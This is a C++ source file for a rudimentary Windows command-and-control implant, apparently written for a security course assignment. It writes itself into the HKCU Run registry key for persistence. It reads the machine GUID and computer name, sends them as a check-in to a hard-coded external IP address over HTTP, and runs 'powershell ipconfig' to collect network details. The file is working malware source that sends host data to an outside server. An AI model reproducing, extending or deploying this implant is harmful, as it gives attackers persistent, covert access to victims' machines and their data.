#include <cstdlib>
#include <fstream>
#include <iostream>
#include "httpClient.h"
#include "rsa.h"
#include "base64.h"

#define INFO_BUFFER_SIZE 32767

LONG getGUID(char* res, DWORD* size);
LONG persistenceLOL(void);
/* List of basic powershell commands: https://devblogs.microsoft.com/scripting/table-of-basic-powershell-commands/ */
int wmain()
{
    persistenceLOL();
    //WELCOME TO THE WORLD
    int msgboxID = MessageBoxA(
        NULL,
        (LPCSTR)"I'm not a malware:D",
        (LPCSTR)"Not a malware",
        MB_ICONWARNING | MB_CANCELTRYCONTINUE | MB_DEFBUTTON2
    );

    //get machine guid
    char value[255];
    DWORD BufferSize = sizeof(value);
    printf("%d", BufferSize);
    if(getGUID(value, &BufferSize)){
        printf("Can't get machine guid\n");
    }
    for(size_t i = 0; i < BufferSize; i++){
        printf("%c", value[i]);
    }

    //get computer name
    char infoBuf[INFO_BUFFER_SIZE];
    DWORD bufCharCount = INFO_BUFFER_SIZE;
    GetComputerNameA((LPSTR)infoBuf, &bufCharCount);
    printf("*** size of buffer: %d\n", BufferSize);
    for(size_t i = 0; i < bufCharCount; i++){
        printf("%c", infoBuf[i]);
    }
    std::string checkin("{\"guido\": ");
    std::string guid(value, BufferSize);
    size_t range = 200000; // 100000 + range is the maximum value you allow
    size_t number = 100000 + (rand() * range) / RAND_MAX;
    std::string sleepTimer = std::to_string(number);
    std::string mName(infoBuf, bufCharCount);
    checkin = checkin + guid + ", \"sleep\": " + sleepTimer + ", \"machinename\": " + mName + ", \"DHKeys\": Nada}";
    std::cout << checkin << std::endl;
    //checkin += ", \"sleepTime\": "; //, \"sleepTime\": 33, \"computerName\": itsme, \"DHKEY\": nada}";
    //checkin += number;
    
    // if successful, connect to the server
    HTTP *client = new HTTP();
    int port = 5000, tls = 0;
    client->connectToServer(L"155.41.47.145", port);
    if(!client->checkConnection()){
        wprintf(L"Error, couldn't connect to server\n");
        return 1;
    }

    // Checkin with the c2
    std::wstring RSA_key = L"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtCpB9NABjMA/DT8W9cto6E48ak7zlPaG5l7K2SMqkzmS/VcGzx9aCduTpkKfJK6Fld9jOHCm2m8U+aTMIuB7eh0qJMrg/BU68r38BgpK7bmaZTrqgGEaBuutfAFkUkkNre9PEgutYjnrFquuvU/PnrKVMfRUhv5RF5rZVq9q2A3H9f2VVOnMD/J8871gEHX1khWtHwolrTPO4Uj4gJsoc3Dh45adKiqkBdR75E3U/ypGcWXre7tPdweVWXGCAYsxHwSj9PX2Yuuacb3i84AyP4+juqk09VFyv+3XNLbgW4dFgxrIBDtYuoVcuSVOfycFJYY/ve5zprullMDG9sHf/wIDAQAB";
    printf("%d\n", RSA_key.size());
    DWORD key_size;
    decode(RSA_key, NULL, &key_size);
    BYTE *bRSA_key = new BYTE[key_size];
    decode(RSA_key, bRSA_key, &key_size);

    RSA *rsa = new RSA(bRSA_key, key_size);
    char test[] = "HEllo world";
    rsa->Encrypt((BYTE*)test, 11);
    printf("ciphertext: %s\n ciphertext size: %d\n", rsa->ciphertext, rsa->ptBufferSize);

    client->additionalHeader = L"User-Agent: IWasBornInTheUSA";
    client->header_size = 28;
    client->requestData = (char*)checkin.c_str();
    client->data_size = checkin.size();
    std::wcout << client->makeHttpRequest(L"POST", L"/checkIn", tls) << std::endl;
    printf("size of data_size: %d\n", client->data_size);
    //std::wcout << client->makeHttpRequest(L"POST", L"/jobs", tls) << std::endl;

    // implant first checks the Computer Name and IP address. Then sends it to the c2
    std::system("powershell ipconfig >C:\\Users\\User\\test.txt");
    std::ifstream temp_file("C:\\Users\\User\\test.txt");
    std::string first_impression((std::istreambuf_iterator<char>(temp_file)), std::istreambuf_iterator<char>());
    std::remove("C:\\Users\\User\\test.txt");
    printf("%s + %d\n%s\n", infoBuf, first_impression.size(), first_impression.c_str());

    delete client;
    return 0;
}

// https://stackoverflow.com/questions/48432994/c-read-machine-guid-via-reggetvalue
LONG getGUID(char* res, DWORD* size){
    HKEY mykey = NULL;
    auto result = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ, &mykey);
    //LONG result = RegGetValueA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", RRF_RT_REG_SZ, NULL, res, size);
    if (result == 0){
        RegQueryValueExA(mykey, "MachineGuid", NULL, NULL, (LPBYTE)res, size);
        RegCloseKey(mykey);
    }
    else{
        std::cerr << "Error: " << res << std::endl;
        return 1;
    }
    return 0;
}

LONG persistenceLOL(){
    HKEY mykey = NULL;
    LONG res = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &mykey);
    const char* czStartName = "trolllolol";
    const char* czExePath   = "\"C:\\Users\\user\\Desktop\\vs_programs\\Assignment-4\\a.exe\"";
    res = RegSetValueExA(mykey, (LPCSTR)czStartName, 0, REG_SZ, (unsigned char*)czExePath, strlen(czExePath) + 1);
    RegCloseKey(mykey);
    return res;
}
